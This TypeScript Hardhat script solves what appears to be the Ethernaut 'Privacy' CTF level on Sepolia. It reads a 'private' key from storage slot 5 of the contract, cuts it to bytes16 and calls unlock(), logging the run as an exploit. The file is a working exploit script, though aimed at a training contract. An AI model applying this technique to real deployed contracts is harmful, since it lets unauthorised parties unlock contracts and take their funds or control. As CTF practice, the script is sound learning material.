import { ethers } from "hardhat";

/**
 * Reads the private key from the Privacy contract and uses it to unlock the contract
 * 
 * Usage: 
 * npx hardhat run scripts/level-12-privacy/read-privacy-key.ts --network sepolia
 * CONTRACT_ADDRESS=0xYourAddress npx hardhat run scripts/level-12-privacy/read-privacy-key.ts --network sepolia
 */
async function main() {
  // Get contract address from environment variable or use default
  const defaultAddress = "0xD404840fEB422d46BD63Cf2Cd748A488e78Ec390"; // Replace with your actual default address
  const contractAddress = process.env.CONTRACT_ADDRESS || defaultAddress;
  
  console.log(`Using Privacy contract address: ${contractAddress}`);
  
  // Define a minimal ABI for the Privacy contract
  const privacyABI = [
    "function locked() view returns (bool)",
    "function unlock(bytes16 _key) public"
  ];
  
  // Create a contract instance using the minimal ABI
  const privacyContract = new ethers.Contract(contractAddress, privacyABI, ethers.provider);
  
  const [deployer] = await ethers.getSigners();
  console.log(`Attacker address: ${deployer.address}`);

  try {
    // Check if the contract is initially locked
    console.log("Checking if Privacy contract is locked...");
    const isLocked = await privacyContract.locked();
    console.log(`Privacy contract is locked: ${isLocked}`);
    
    if (!isLocked) {
      console.log("Privacy contract is already unlocked! No need to proceed further.");
      return;
    }
    
    // Understand the storage layout for the Privacy contract:
    // Slot 0: locked (bool, 1 byte), flattening (uint8, 1 byte), denomination (uint8, 1 byte), awkwardness (uint16, 2 bytes)
    // Slot 1: ID (uint256, 32 bytes)
    // Slots 3-5: data array (bytes32[3])
    // We need data[2] which is at slot 5
    console.log("Reading key from storage slot 5 (data[2])...");
    const storageData = await ethers.provider.getStorage(contractAddress, 5);
    console.log(`Retrieved data[2] from storage: ${storageData}`);
    
    // Convert the bytes32 to bytes16 (take first 16 bytes)
    // In Solidity: bytes16 key = bytes16(data[2]);
    const key = storageData.substring(0, 34); // "0x" + 32 characters (16 bytes)
    console.log(`Converted to bytes16 key: ${key}`);
    
    // Unlock the contract using the retrieved key
    console.log("Unlocking the Privacy contract...");
    const tx = await privacyContract.connect(deployer).getFunction("unlock")(key);
    
    // Wait for the transaction to be mined
    console.log("Waiting for unlock transaction to be mined...");
    const receipt = await tx.wait();
    
    // Check if the contract is now unlocked
    console.log("Checking if Privacy contract is now unlocked...");
    const isStillLocked = await privacyContract.locked();
    console.log(`Privacy contract is locked: ${isStillLocked}`);
    
    // Report success or failure
    if (!isStillLocked) {
      console.log("\nExploit successful! The Privacy contract has been unlocked.");
    } else {
      console.log("\nExploit failed. The Privacy contract is still locked.");
    }
    
    // Make sure receipt is not null before accessing its properties
    if (receipt) {
      console.log(`\nTransaction details:`);
      console.log(`Hash: ${receipt.hash}`);
      console.log(`Gas used: ${receipt.gasUsed.toString()}`);
      console.log(`Block number: ${receipt.blockNumber}`);
    }
  } catch (error) {
    console.error("\nError executing exploit:", error);
    process.exitCode = 1;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
